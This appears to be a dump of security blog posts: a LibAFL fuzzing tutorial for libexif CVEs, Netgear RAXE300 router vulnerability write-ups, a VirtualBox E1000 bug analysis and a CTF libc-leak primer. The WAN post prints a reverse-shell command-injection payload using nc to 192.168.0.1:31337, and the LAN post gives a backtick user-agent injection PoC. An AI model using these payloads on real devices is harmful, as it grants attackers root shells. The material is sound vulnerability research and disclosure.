Scheduler # V·ªÅ Scheduler m√¨nh s·∫Ω s·ª≠ d·ª•ng l·∫°i c√°c component c·ªßa b√†i tr∆∞·ªõc\nQueueScheduler s·ª≠ d·ª•ng ƒë·ªÉ s·∫Øp x·∫øp c√°c corpus theo 1 th·ª© t·ª± nh·∫•t ƒë·ªãnh IndexesLenTimeMinimizerScheduler s·∫Ω ∆∞u ti√™n c√°c test case g·ªçn v√† nhanh ·ªü trong corpus input let scheduler = IndexesLenTimeMinimizerScheduler::new(QueueScheduler::new()); 8th Component: Fuzzer # StdFuzzer s·∫Ω k·∫øt h·ª£p c√°c component v·ªõi nhau v√† ch·∫°y ch√∫ng. ƒê·ªÉ hi·ªÉu r√µ h∆°n th√¨ h√£y ƒë·ªçc l·∫°i b√†i post tr∆∞·ªõc c·ªßa m√¨nh 8th Component: Fuzzer\n// A fuzzer with feedback, objectives, and a corpus scheduler let mut fuzzer = StdFuzzer::new(scheduler, feedback, objective); 9th Component: Harness # V·ªÅ exercise l·∫ßn n√†y m√¨nh s·∫Ω th√™m v√†o component harness, n√≥ s·∫Ω c√≥ t√°c d·ª•ng ƒë∆∞a v√†o c√°c bytes ƒë√£ ƒë∆∞·ª£c mutate b·ªüi fuzzer v√† ƒë∆∞a ch√∫ng v√†o trong h√†m LLVMFuzzerTestOneInput trong file harness.c\n// // Component: harness // let mut harness = |input: \u0026amp;BytesInput| { let target = input.target_bytes(); let buffer = target.as_slice(); libfuzzer_test_one_input(buffer); ExitKind::Ok }; 10th Component: Executor # Component n√†y m√¨nh th√™m v√†o v·ªõi h√†m t∆∞∆°ng ·ª©ng l√†\nInProcessExecutor s·∫Ω thay th·∫ø ForkserverExecutor l√† b·ªüi v√¨ ch√∫ng ta ch·∫°y fuzz d∆∞·ªõi d·∫°ng m·ªôt file binary ƒë∆∞·ª£c ch·∫°y ƒë·ªôc l·∫≠p, vi·ªác n√†y s·∫Ω l√†m tƒÉng t·ªëc ƒë·ªô qu√° tr√¨nh fuzzing. TimeoutExecutor set timeout tr∆∞·ªõc khi m·ªói l·∫ßn ch·∫°y file target tr√°nh vi·ªác c√°c test case g√¢y ch·∫≠m qu√° tr√¨nh fuzzing, ngo√†i ra n√≥ c√≤n k·∫øt h·ª£p v·ªõi c√°c component kh√°c ƒë·ªÉ x√°c ƒë·ªãnh c√°c test case g√¢y time out. let in_proc_executor = InProcessExecutor::new( \u0026amp;mut harness, tuple_list!(edges_observer, time_observer), \u0026amp;mut fuzzer, \u0026amp;mut state, \u0026amp;mut mgr, ) .unwrap(); let timeout = Duration::from_millis(5000); // wrap in process executor with a timeout let mut executor = TimeoutExecutor::new(in_proc_executor, timeout); 11th Component: Mutator \u0026amp; Stage # StdScheduledMutator StdMutationalStage // // Component: Mutator // // Setup a mutational stage with a basic bytes mutator let mutator = StdScheduledMutator::new(havoc_mutations()); // // Component: Stage // let mut stages = tuple_list!(StdMutationalStage::new(mutator)); Combine Everythin and Running the fuzzer # fuzzer .fuzz_loop_for(\u0026amp;mut stages, \u0026amp;mut executor, \u0026amp;mut state, \u0026amp;mut mgr, 1000) .unwrap(); Fuzz\u0026rsquo;em All # Setup # Sau khi m·ªçi th·ª© ƒë√£ ho√†n t·∫•t v√† vi·ªác b√¢y gi·ªù c·ªßa ch√∫ng ta ƒë√≥ l√† build v√† ch·∫°y fuzz\nSau khi build xong th√¨ k·∫øt qu·∫£ l√† ch√∫ng ta s·∫Ω c√≥ 1 folder build nh∆∞ b√™n d∆∞·ªõi\nV√† vi·ªác b√¢y gi·ªù c·ªßa ch√∫ng ta ƒë√≥ l√† setup ASAN v√† ch·∫°y fuzz.\nNh∆∞ m√¨nh ƒë√£ n√≥i ·ªü tr√™n th√¨ ƒë·ªÉ ƒë·∫°t ƒë∆∞·ª£c target m√† ch√∫ng ta c·∫ßn ƒë√≥ l√† memory error th√¨ ch√∫ng ta c·∫ßn ph·∫£i c√≥ ASAN, tuy nhi√™n ·ªü ch·∫ø ƒë·ªô m·∫∑c ƒë·ªãnh th√¨ ASAN s·∫Ω t·ª± ƒë·ªông exit sau m·ªói l·∫ßn d√≠nh crash, nh∆∞ng target c·ªßa ch√∫ng ta c·∫ßn ƒë√≥ l√† 2 bug, OOB read and write, v√† vi·ªác exit c·ªßa ASAN s·∫Ω khi·∫øn cho qu√° tr√¨nh fuzzing c·ªßa ch√∫ng ta b·ªã ch·ªØng l·∫°i v√† khi·∫øn cho ch√∫ng ta ph·∫£i ch·∫°y l·∫°i t·ª´ ƒë·∫ßu. Th·∫ø n√™n command line b√™n d∆∞·ªõi s·∫Ω set flag cho ASAN kh√¥ng exit khi m·ªói l·∫ßn g·∫∑p crash.\nASAN_OPTIONS=abort_on_error=1\nCh·∫°y fuzzing # ƒê·ªÉ ch·∫°y fuzzer ch√∫ng ta c·∫ßn 2 terminal, 1 c√°i ƒë·ªÉ fuzz target v·ªõi config m√† ch√∫ng ta ƒë√£ x√°c ƒë·ªãnh t·ª´ tr∆∞·ªõc v√† 1 c√°i ƒë·ªÉ fuzz target v·ªõi ASAN\nTerminal 1 running fuzzer with ASAN\nTerminal 2 running fuzzer target\nResult # V√† sau khi ch·∫°y 1 l√∫c th√¨ ch√∫ng ta ƒë√£ c√≥ k·∫øt qu·∫£\nV√≠ d·ª• v·ªÅ report c·ªßa ASAN\nC√≤n 1 ƒëo·∫°n v·ªÅ triage n·ªØa nh∆∞ng m√¨nh kh√° l∆∞·ªùi ƒë·ªÉ vi·∫øt, n√¥m na n√≥ d√πng ƒë·ªÉ x√°c ƒë·ªãnh xem c√°c solution c·ªßa ch√∫ng ta c√≥ unique bug n√†o hay kh√¥ng, nh∆∞ng b√†i t·ªõi ƒë√¢y c≈©ng kh√° d√†i r·ªìi, h·∫πn c√°c b·∫°n v√†o 1 b√†i kh√°c m√¨nh s·∫Ω l√†m r√µ v·ªÅ ph·∫ßn n√†y (ho·∫∑c kh√¥ng \u0026hellip;.)\nvia GIPHY\n","date":"27 November 2023","externalUrl":null,"permalink":"/posts/fuzzing_holy_bible_chapter2/","section":"Posts","summary":"Using LibAFL fuzzer to reproduce CVE-2009-3895 \u0026amp; CVE-2012-2836","title":"LibAFL Fuzzing Holy Bible - Chapter II: Fuzzing Libexif - CVE-2009-3895 \u0026 CVE-2012-2836","type":"posts"},{"content":"","date":"25 April 2023","externalUrl":null,"permalink":"/tags/netgear/","section":"Tags","summary":"","title":"Netgear","type":"tags"},{"content":" background # Nighthawk RAXE300 router has a binary file call pucfu, lies in /bin/pucfu. This file main function is checking the firmware update. This file is executed while the router is booted and it will attempt to connect https://devcom.up.netgear.com/, and sending a https request to it.\nanalyze and root cause of vulnerability # It sending a request to https://devcom.up.netgear.com/ by curl_post (usr/lib/libfwcheck.so) function, and it is quite interested in this below snippet.\nsize_t __fastcall curl_post(const char *url, const char *post_data, void **a3) { /// fw_debug(1, \u0026#34; URL is %s\\n\u0026#34;, url); curl_easy_setopt(curl, 10002, url); curl_easy_setopt(curl, 10023, http_content_header); curl_easy_setopt(curl, 10015, post_data); curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0); //1 curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0); //2 curl_easy_setopt(curl, CURLOPT_HTTP_VERSION, 1); data_size = strlen(post_data); curl_easy_setopt(curl, CURLOPT_INFILESIZE_LARGE, data_size); curl_easy_setopt(curl, 20011, sub_68CC); curl_easy_setopt(curl, 10001, s); } The first vulnerable lies in the line of comment [1] and [2].\ncurl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0); //1, this function setting CURLOPT_SSL_VERIFYHOST to 0, which mean, it\u0026rsquo;s disable hostname verification and cURL will not verify the server\u0026rsquo;s hostname. curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0); //2, similar to the above function, this line of code, it\u0026rsquo;s disable the verification of SSL/TLS certificate, which mean it won\u0026rsquo;t check the validity of the server\u0026rsquo;s SSL/TLS certification.\nCombine the two line of flaw code above, hacker can abuse it to perform man-in-the-middle attack, which mean they can fake the DHCP or DNS update server.\nNormal respone from the server:\n{ \u0026#34;status\u0026#34;: 1, \u0026#34;errorCode\u0026#34;: null, \u0026#34;message\u0026#34;: null, \u0026#34;url\u0026#34;: \u0026#34;https://test\u0026#34; } The second vulnerability lies in pufwUpgrade, this file is executed at the same time with pucfu file, it\u0026rsquo;s check the firmware upgrade and the url to check for upgrade is from /tmp/fw/cfu_url_cache (which store before in pucfu file). After it reads the url for update, the FwGetUpdate function at address 0x000126F8 in pufwUpgrade binary file, the FwGetUpdate function push the url to the DownloadFiles function as the first argument.\nint FwGetUpdate(int a1) { // while ( 1 ) { SetFileValue(\u0026#34;/data/fwLastChecked\u0026#34;, \u0026#34;lastDL_sku\u0026#34;, v69); SetFileValue(\u0026#34;/data/fwLastChecked\u0026#34;, \u0026#34;lastDL_url\u0026#34;, \u0026amp;byte_2717C); v4 = DownloadFiles(firmware_url_update, \u0026#34;/tmp/fw/dl_fileinfo_unicode\u0026#34;, \u0026#34;/tmp/fw/dl_result\u0026#34;, 0); /// } } In the DownloadFiles (at address 0x00002DE0 in file libpu_util.so) function, the url is stored as a string for the command line.\nint DownloadFiles(const char *url_update, const char *a2, char *filename, int a4) { if (is_http) { // }else { snprintf( s, 0x1F4u, \u0026#34;(curl --fail --insecure %s --max-time %d --speed-time 15 --speed-limit 1000 -o %s 2\u0026gt; %s; echo $? \u0026gt; %s)\u0026#34;, url_update, v7, a2, \u0026#34;/tmp/curl_result_err.txt\u0026#34;, \u0026#34;/tmp/curl_result.txt\u0026#34;); j_DBG_PRINT(\u0026#34;%s:%d, cmd=%s\\n\u0026#34;, \u0026#34;DownloadFiles\u0026#34;, 328, s); v15 = j_pegaPopen((int)s, (int)\u0026#34;r\u0026#34;); // } } The command line (which has url inside) is push into j_pegaPopen function as the first argument, after that in pegaPopen function (at address 0x00001D74 in libpu_util.so file), it\u0026rsquo;s execute the command line as the first argument with /bin/sh.\nCombine the two bug above, attacker can fake the https update server and do command injection in the url easily.\nCommand Injection In Respone Data # { \u0026#34;status\u0026#34;: 1, \u0026#34;errorCode\u0026#34;: null, \u0026#34;message\u0026#34;: null, \u0026#34;url\u0026#34;: \u0026#34;\u0026#39;; rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2\u0026gt; 1|nc 192.168.0.1 31337 \u0026gt;/tmp/f #\u0026#34; } The above snippet injects the reverse shell command rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2\u0026gt; 1|nc 192.168.0.1 31337 \u0026gt;/tmp/f (https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) into the url parameter, which mean it will sending a root shell to IP 192.168.0.1 port 31337.\n","date":"25 April 2023","externalUrl":null,"permalink":"/posts/wan_bug_raxe300/","section":"Posts","summary":"Second bug I found in RAXE300 Netgear device. A WAN bug lead to RCE","title":"WAN bug in RAXE300","type":"posts"},{"content":" background # After studied about security and played CTF for a year, I decide to move on to the real world playground, and I choose Nighthawk RAXE300 as a target. Below is how I found the command injection bug in Nighthawk RAXE300.\nAfter studying of hacking router devices, I realized that common LAN bug come from many of services such as: hostapd, httpd, smb,\u0026hellip; So when started to analyze the RAXE300 firmware, I\u0026rsquo;m try to reverse some files like: pudil, pucfu, dhcpc, puhttpsniff, they took me a lot of time and efford for reversing. When I stop at puhttpsniff, It\u0026rsquo;s quite an interested file and code base of it quite small, so I decide to dig deep into puhttpsniff.\nLAN bug in RAXE300 firmware # I discovered one of the many vulnerabilities of RAXE300 was the command injection in \u0026ndash;user-agent field of the device. The bug lie in the function at address 0x10EC0 of puhttpsniff binary file, you can see in the below snippet:\nchar *__fastcall sub_10EC0(const char *a1, int a2, _WORD *a3, int a4) { ... result = strstr(a1, \u0026#34;User-Agent: \u0026#34;); if ( result ) { _isoc99_sscanf(result + 12, \u0026#34;%255[^\\r\\n]\u0026#34;, v17); .... sprintf((char *)v18, \u0026#34;pudil -i %s \\\u0026#34;%s\\\u0026#34;\u0026#34;, v12, (const char *)v17); result = (char *)system((const char *)v18); ... } ... } In summary, the above function, it takes contents from User-Agent field and pass it into the second argument of pudil command and run it with system command.\nAs you can see the above code. First it find does User-Agent exist in a1 variable by result = strstr(a1, \u0026quot;User-Agent: \u0026quot;); , after that it reads input with _isoc99_sscanf(result + 12, \u0026quot;%255[^\\r\\n]\u0026quot;, v17); and store it in v17 variable. Next it pass v17 as the second argument into pudil command and store the string in v18 variable, sprintf((char *)v18, \u0026quot;pudil -i %s \\\u0026quot;%s\\\u0026quot;\u0026quot;, v12, (const char *)v17);. After that it run the command by system function with v18 is the first argument.\nBecause it doesn\u0026rsquo;t check some special character, so we can easy to exploit the command injection bug with ` character.\nPoC: curl --user-agent \u0026quot;a`ls`\u0026quot; 192.168.0.1\n","date":"21 April 2023","externalUrl":null,"permalink":"/posts/my_very_first_bug/","section":"Posts","summary":"My first bug I found in Real World stuff. A LAN bug in RAXE300 Netgear device","title":"My very first bug","type":"posts"},{"content":"","date":"28 November 2022","externalUrl":null,"permalink":"/tags/virtualbox/","section":"Tags","summary":"","title":"Virtualbox","type":"tags"},{"content":" m·∫£ng Tx(transmit) descriptor s·∫Ω tr√¥ng nh∆∞ th·∫ø n√†y [context_1, data_2, data_3, context_4, data_5]\ncontext_1.header_length = 0 context_1.maximum_segment_size = 0x3010 context_1.tcp_segmentation_enabled = true data_2.data_length = 0x10 data_2.end_of_packet = false data_2.tcp_segmentation_enabled = true data_3.data_length = 0 data_3.end_of_packet = true data_3.tcp_segmentation_enabled = true context_4.header_length = 0 context_4.maximum_segment_size = 0xF context_4.tcp_segmentation_enabled = true data_5.data_length = 0x4188 data_5.end_of_packet = true data_5.tcp_segmentation_enabled = true Ph√¢n t√≠ch nguy√™n nh√¢n c·ªët l·ªói g√¢y ra bug # C√°c h√†m quan tr·ªçng c·∫ßn ph·∫£i n·∫Øm\ne1kXmitPending() (src/VBox/Devices/Network/DevE1000.cpp) static int e1kXmitPending(PE1KSTATE pThis, bool fOnWorkerThread) { ... while (!pThis-\u0026gt;fLocked \u0026amp;\u0026amp; e1kTxDLazyLoad(pThis)) { while (e1kLocateTxPacket(pThis)) { fIncomplete = false; /* Found a complete packet, allocate it. */ rc = e1kXmitAllocBuf(pThis, pThis-\u0026gt;fGSO); /* If we\u0026#39;re out of bandwidth we\u0026#39;ll come back later. */ if (RT_FAILURE(rc)) goto out; /* Copy the packet to allocated buffer and send it. */ rc = e1kXmitPacket(pThis, fOnWorkerThread); /* If we\u0026#39;re out of bandwidth we\u0026#39;ll come back later. */ if (RT_FAILURE(rc)) goto out; } } ... } DECLINLINE(bool) e1kTxDLazyLoad(PE1KSTATE pThis) { if (pThis-\u0026gt;nTxDFetched == 0) return e1kTxDLoadMore(pThis) != 0; return true; } Gi·∫£ s·ª≠ c√°c descriptor ·ªü tr√™n ƒë∆∞·ª£c ghi v√†o Tx Ring(l√† ngu·ªìn t·ª´ ph·∫ßn c·ª©ng th√¥ng qua h·ªá th·ªëng c√°i m√† ƒë∆∞·ª£c nh·∫≠n v√†o v√† g·ª≠i c√°c g√≥i tin t·ªõi m·∫°ng). H√†m e1kTxDLazyLoad() s·∫Ω ƒë∆∞·ª£c th·ª±c thi, l√∫c n√†y n√≥ s·∫Ω ƒë·ªçc 5 descriptor t·ª´ Tx Ring. T·∫°i l·∫ßn ƒë·∫ßu ti√™n g·ªçi t·ªõi h√†m e1kLocateTxPacket(), th√¨ h√†m n√†y s·∫Ω ƒëi qua 1 l∆∞·ª£t c√°c descriptor ƒë∆∞·ª£c kh·ªüi t·∫°o nh∆∞ng n√≥ kh√¥ng handle ch√∫ng, ·ªü l·∫ßn ƒë·∫ßu ti√™n th√¨ n√≥ ch·ªâ ƒë·ªçc 3 descriptor ƒë·∫ßu ([context_1, data_2, data_3]) v√† v√≤ng l·∫∑p th·ª© 2 n√≥ s·∫Ω ƒë·ªçc 2 descriptor c√≤n l·∫°i ([context_4, data_5]).\ne1kLocateTxPacket() static bool e1kLocateTxPacket(PE1KSTATE pThis) { ... for (int i = pThis-\u0026gt;iTxDCurrent; i \u0026lt; pThis-\u0026gt;nTxDFetched; ++i) { E1KTXDESC *pDesc = \u0026amp;pThis-\u0026gt;aTxDescriptors[i]; switch (e1kGetDescType(pDesc)) { case E1K_DTYP_CONTEXT: e1kUpdateTxContext(pThis, pDesc); continue; case E1K_DTYP_LEGACY: /* Skip empty descriptors. */ if (!pDesc-\u0026gt;legacy.u64BufAddr || !pDesc-\u0026gt;legacy.cmd.u16Length) break; cbPacket += pDesc-\u0026gt;legacy.cmd.u16Length; pThis-\u0026gt;fGSO = false; break; case E1K_DTYP_DATA: /* Skip empty descriptors. */ ... } } } Descriptor ƒë·∫ßu ti√™n ([context_1]) n√≥ s·∫Ω l√† case E1K_DTYP_CONTEXT th√¨ h√†m e1kUpdateTxContext() s·∫Ω ƒë∆∞·ª£c g·ªçi v√† c·∫≠p nh·∫≠t TCP Segmentation Context n·∫øu nh∆∞ TCP Segmentation ƒë∆∞·ª£c b·∫≠t cho descriptor ƒë√≥.\nDescriptor th·ª© hai ([data_2]) l√† case E1K_DTYP_DATA(), n√≥ kh√¥ng quan tr·ªçng trong b√†i vi·∫øt n√†y n√™n ko c·∫ßn nh·∫Øc t·ªõi.\nDescriptor th·ª© 3 ([data_3]) c≈©ng l√† case E1K_DTYP_DATA(), nh∆∞ng m√† do data_3.data_length = 0 v√¨ th·∫ø n√™n s·∫Ω kh√¥ng c√≥ chuy·ªán g√¨ x·∫£y ra\nSau khi th·ª±c hi·ªán xong h√†m switch case th√¨ s·∫Ω c√≥ m·ªôt h√†m check li·ªáu thu·ªôc t√≠nh end_of_packet c·ªßa descriptor ƒë√≥ c√≥ true hay kh√¥ng. T·∫°i v√¨ data_3.end_of_packet = true v·∫≠y n√™n s·∫Ω th·ª±c thi c√¢u l·ªánh b√™n trong h√†m if v√† return v·ªÅ true.\nif (pDesc-\u0026gt;legacy.cmd.fEOP) { ... return true; } N·∫øu nh∆∞ data_3.end_of_packet ƒë∆∞·ª£c set th√†nh false th√¨ 2 descriptor c√≤n l·∫°i [context_4, data_5] s·∫Ω ƒë∆∞·ª£c x·ª≠ l√Ω v√† l·ªó h·ªïng s·∫Ω ƒë∆∞·ª£c bypassed.\nB√™n trong v√≤ng l·∫∑p while true c·ªßa h√†m e1kXmitPending() c√≥ g·ªçi ƒë·∫øn h√†m e1kXmitPacket(), ·ªü h√†m n√†y n√≥ s·∫Ω x·ª≠ l√Ω to√†n b·ªô descriptor c·ªßa ch√∫ng ta (·ªü ƒë√¢y l√† 5)\nwhile (pThis-\u0026gt;iTxDCurrent \u0026lt; pThis-\u0026gt;nTxDFetched) { E1KTXDESC *pDesc = \u0026amp;pThis-\u0026gt;aTxDescriptors[pThis-\u0026gt;iTxDCurrent]; ... rc = e1kXmitDesc(pThis, pDesc, e1kDescAddr(TDBAH, TDBAL, TDH), fOnWorkerThread); ... if (e1kGetDescType(pDesc) != E1K_DTYP_CONTEXT \u0026amp;\u0026amp; pDesc-\u0026gt;legacy.cmd.fEOP) break; } ·ª®ng v·ªõi m·ªói descriptor th√¨ h√†m e1kXmitDesc() s·∫Ω ƒë∆∞·ª£c g·ªçi ƒë·ªÉ x·ª≠ l√Ω n√≥\nstatic int e1kXmitDesc(PE1KSTATE pThis, E1KTXDESC *pDesc, RTGCPHYS addr, bool fOnWorkerThread) { ... switch (e1kGetDescType(pDesc)) { case E1K_DTYP_CONTEXT: ... break; case E1K_DTYP_DATA: { ... if (pDesc-\u0026gt;data.cmd.u20DTALEN == 0 || pDesc-\u0026gt;data.u64BufAddr == 0) { E1kLog2((\u0026#34;% Empty data descriptor, skipped.\\n\u0026#34;, pThis-\u0026gt;szPrf)); } else { if (e1kXmitIsGsoBuf(pThis-\u0026gt;CTX_SUFF(pTxSg))) { ... } else if (!pDesc-\u0026gt;data.cmd.fTSE) { ... } else { STAM_COUNTER_INC(\u0026amp;pThis-\u0026gt;StatTxPathFallback); rc = e1kFallbackAddToFrame(pThis, pDesc, fOnWorkerThread); } } ... } } } L·∫ßn l∆∞·ª£t c√°c descriptor ƒë∆∞·ª£c ƒë∆∞a v√†o ƒë·ªÉ x·ª≠ l√Ω v√† th·ª±c thi c√°c h√†m b√™n trong case t∆∞∆°ng ·ª©ng c·ªßa n√≥\nV·ªõi descriptor ƒë·∫ßu ti√™n l√† context_1 th√¨ n√≥ s·∫Ω kh√¥ng l√†m g√¨ h·∫øt\nT·∫°i v√¨ tcp_segmentation_enable == true v·ªõi t·∫•t c·∫£ c√°c data transcriptor th√¨ c√¢u l·ªánh b√™n trong h√†m else c·ªßa c√¢u l·ªánh if (e1kXmitIsGsoBuf(pThis-\u0026gt;CTX_SUFF(pTxSg))) ƒë∆∞·ª£c g·ªçi t·ª©c l√† h√†m e1kFallbackAddToFrame() s·∫Ω ƒë∆∞·ª£c th·ª±c thi, tuy nhi√™n ·ªü b√™n trong h√†m e1kFallbackAddToFrame() c√≥ bug interger underflow l√∫c m√† data_5 ƒë∆∞·ª£c x·ª≠ l√Ω.\nstatic int e1kFallbackAddToFrame(PE1KSTATE pThis, E1KTXDESC *pDesc, bool fOnWorkerThread) { ... uint16_t u16MaxPktLen = pThis-\u0026gt;contextTSE.dw3.u8HDRLEN + pThis-\u0026gt;contextTSE.dw3.u16MSS; /* * Carve out segments. */ int rc = VINF_SUCCESS; do { /* Calculate how many bytes we have left in this TCP segment */ uint32_t cb = u16MaxPktLen - pThis-\u0026gt;u16TxPktLen; if (cb \u0026gt; pDesc-\u0026gt;data.cmd.u20DTALEN) { /* This descriptor fits completely into current segment */ cb = pDesc-\u0026gt;data.cmd.u20DTALEN; rc = e1kFallbackAddSegment(pThis, pDesc-\u0026gt;data.u64BufAddr, cb, pDesc-\u0026gt;data.cmd.fEOP /*fSend*/, fOnWorkerThread); } else { ... } pDesc-\u0026gt;data.u64BufAddr += cb; pDesc-\u0026gt;data.cmd.u20DTALEN -= cb; } while (pDesc-\u0026gt;data.cmd.u20DTALEN \u0026gt; 0 \u0026amp;\u0026amp; RT_SUCCESS(rc)); if (pDesc-\u0026gt;data.cmd.fEOP) { ... pThis-\u0026gt;u16TxPktLen = 0; ... } return VINF_SUCCESS; /// @todo consider rc; } ·ªû h√†m tr√™n c√≥ bi·∫øn uint16_t u16MaxPktLen, pThis-\u0026gt;u16TxPktLen v√† pDesc-\u0026gt;data.cmd.u20DTALEN l√† ƒë√°ng ƒë·ªÉ ch√∫ √Ω ƒë·∫øn.\nif (e1kGetDescType(pDesc) != E1K_DTYP_CONTEXT \u0026amp;\u0026amp; pDesc-\u0026gt;legacy.cmd.fEOP) break; ·ªû b√™n trong h√†m e1kXmitPacket() n√≥ c√≥ ƒë·ªÅ c·∫≠p ƒë·∫øn n·∫øu nh∆∞ descriptor ƒëang ƒë∆∞·ª£c x·ª≠ l√Ω l√† data v√† end_of_packet == true th√¨ n√≥ s·∫Ω tho√°t kh·ªèi v√≤ng l·∫∑p. Transcriptor data_3 c√≥ data_3.end_of_packet == true t·∫•t y·∫øu s·∫Ω h·ªßy v√≤ng l·∫∑p trong khi c√≤n 2 descriptor c√≤n l·∫°i l√† ch∆∞a ƒë∆∞·ª£c x·ª≠ l√Ω, t·∫°i sao ƒëi·ªÅu n√†y l·∫°i quan tr·ªçng, th√¨ t·∫•t c·∫£ c√°c context descriptor ƒë·ªÅu ƒë∆∞·ª£c ƒë·ªçc sau khi ƒë√£ x·ª≠ l√Ω xong data descriptor. Context descriptor ƒë∆∞·ª£c x·ª≠ l√Ω trong su·ªët qu√° tr√¨nh TCP Segmentation Context Update ·ªü trong h√†m e1kLocateTxPacket() v√† data descriptor ƒë∆∞·ª£c x·ª≠ l√Ω sau ƒë√≥ t·∫°i b√™n trong v√≤ng l·∫∑p c·ªßa h√†m e1kXmitPacket(). Ng∆∞·ªùi l·∫≠p tr√¨nh h∆∞·ªõng theo nh∆∞ v·∫≠y v·ªõi m·ª•c ƒë√≠ch ngƒÉn c·∫£n s·ª± thay ƒë·ªïi gi√° tr·ªã c·ªßa bi·∫øn u16MaxPktLen tr∆∞·ªõc khi m·ªôt s·ªë data ƒë∆∞·ª£c th·ª±c thi ƒë·ªÉ ngƒÉn c·∫£n bug interger underflow t·∫°i h√†m e1kFallbackAddToFrame():\nuint32_t cb = u16MaxPktLen - pThis-\u0026gt;u16TxPktLen Nh∆∞ng v·∫´n c√≥ c√°ch ƒë·ªÉ bypass c∆° ch·∫ø b·∫£o v·ªá n√†y\n","date":"28 November 2022","externalUrl":null,"permalink":"/posts/virtualbox_e1000_0day_reproduce/","section":"Posts","summary":"VirtualBox E1000 Guest-to-Host Escape. But it not done yet \u0026hellip;.","title":"Virtualbox e1000 0day Reproduce","type":"posts"},{"content":"","date":"16 September 2022","externalUrl":null,"permalink":"/tags/technique/","section":"Tags","summary":"","title":"Technique","type":"tags"},{"content":" :memo: T·∫£n m·∫°n m·ªôt x√≠u v·ªÅ technique tr√™n? # Libc l√† g√¨ :rocket: # (n·∫øu nh∆∞ c√°c b·∫°n ƒë√£ bi·∫øt libc l√† g√¨ v√† bi·∫øt technique ret2libc th√¨ c√≥ th·ªÉ b·ªè qua ph·∫ßn n√†y) ƒê·ªëi v·ªõi m·ªôt s·ªë b·∫°n ch∆°i Pwnable n√≥i ri√™ng v√† c√°c b·∫°n ch∆°i CTF n√≥i chung th√¨ ƒë√£ √≠t nhi·ªÅu nghe ƒë·∫øn c·ª•m t·ª´ \u0026ldquo;Libc\u0026rdquo;. V·∫≠y libc l√† g√¨? \u0026quot;C·ª•m t·ª´ \u0026quot;libc\u0026quot; th∆∞·ªùng ƒë∆∞·ª£c d√πng nh∆∞ l√† m·ªôt t·ª´ vi·∫øt t·∫Øt cho \u0026quot;standard C library\u0026quot;, m·ªôt th∆∞ vi·ªán c√°c h√†m c√°i m√† c√≥ th·ªÉ d√πng b·ªüi t·∫•t c·∫£ C programs\u0026quot;\nV·∫≠y c√≥ nghƒ©a, ƒë·ªãa ch·ªâ g·ªëc c·ªßa libc r·∫•t l√† quan tr·ªçng, khi b·∫°n ƒë√£ c√≥ ƒë·ªãa ch·ªâ g·ªëc c·ªßa libc b·∫°n c√≥ th·ªÉ l√†m r·∫•t l√† nhi·ªÅu th·ª©, ƒëi·ªÉn h√¨nh nh·∫•t l√† b·∫°n c√≥ th·ªÉ d√πng one_gadget ƒë·ªÉ execve(\u0026rsquo;/bin/sh\u0026rsquo;,0,0) ho·∫∑c l√† g·ªçi system(\u0026rsquo;/bin/sh\u0026rsquo;),\u0026hellip;.. N√¥m na cu·ªëi c√πng libc d√πng ƒë·ªÉ pop a shell. ƒê·ªÉ c√≥ th·ªÉ ƒë·ªëi ph√≥ v·ªõi v·∫•n ƒë·ªÅ tr√™n, m·ªôt s·ªë challenge\u0026rsquo;s author s·∫Ω kh√¥ng cho b·∫•t c·ª© function(puts, printf,\u0026hellip;.) ƒë·ªÉ c√≥ th·ªÉ leak ra ƒë·ªãa ch·ªâ c·ªßa libc. How this technique works? :face_with_monocle: # M√¨nh kh√¥ng ch·∫Øc ai l√† ng∆∞·ªùi t·∫°o ra technique n√†y nh∆∞ng m√† l·∫ßn ƒë·∫ßu ti√™n m√¨nh th·∫•y n√≥ ƒë∆∞·ª£c √°p d·ª•ng v√†o trong ctf l√† v√†o gi·∫£i HITCON 2018 c√¢u babytcache c·ªßa angelboy.tw, sau ƒë√≥ anh ·∫•y c√≥ publish solution cho c√¢u n√†y t·∫°i ƒë√¢y: github.com/scwuaptx/CTF/blob/master/2018-writeup/hitcon/baby_tcache.py\nV·∫≠y n√™n technique n√†y yang h·ªì hay g·ªçi l√†: Angelboy\u0026rsquo;s leak Technique n√†y s·∫Ω gi·∫£i quy·∫øt v·∫•n ƒë·ªÅ thay ƒë·ªïi c·∫•u tr√∫c stdout c·ªßa IO_FILE ƒë·ªÉ c√≥ th·ªÉ bi·∫øn n√≥ th√†nh h√†m puts ƒë·ªÉ leak ƒë·ªãa ch·ªâ c·ªßa libc. N√≥ thay ƒë·ªïi c·∫•u tr√∫c c·ªßa stdout c·ªßa IO_FILE b·∫±ng c√°ch modify flag bit c·ªßa stdout th√†nh 0xfbad1800 v√† khi·∫øn cho byte cu·ªëi c·ªßa _IO_write_base nh·ªè l·∫°i. ·ªû b√™n d∆∞·ªõi m√¨nh s·∫Ω n√≥i t·∫°i sao modify flag bit c·ªßa stdout th√†nh 0xfbad1800.\nƒê·∫ßu ti√™n ta ph·∫£i hi·ªÉu h√†m puts ho·∫°t ƒë·ªông ra sao :face_with_raised_eyebrow: # M·ªôt c√°i v√≠ d·ª• c∆° b·∫£n v·ªÅ h√†m puts g·ªçi trong libc, th√¨ m√¨nh s·∫Ω d√πng m·ªôt ch∆∞∆°ng tr√¨nh in ra \u0026ldquo;Hello world\u0026rdquo;, m·ªôt ch∆∞∆°ng tr√¨nh t·ª´ thu·ªü s∆° khai ai c≈©ng ph·∫£i ti·∫øp x√∫c trong c√°i b·ªô m√¥n n√†y.\n#include \u0026lt;stdio.h\u0026gt; void main() { printf(\u0026#34;Hello World\\n); } ·ªû c√°c version sau n√†y c·ªßa libc th√¨ khi compile ·ªü assembly code th√¨ n√≥ s·∫Ω g·ªçi tr·ª±c ti·∫øp ƒë·∫øn h√†m printf lu√¥n nh∆∞ng m√† ·ªü c√°c libc c≈© th√¨ n√≥ s·∫Ω g·ªçi ƒë·∫øn h√†m puts nh∆∞ng m√† ƒëi·ªÅu ƒë√≥ v·∫´n kh√¥ng quan tr·ªçng cho l·∫Øm\n.file \u0026#34;hello.c\u0026#34; .section .rodata .LC0: .string 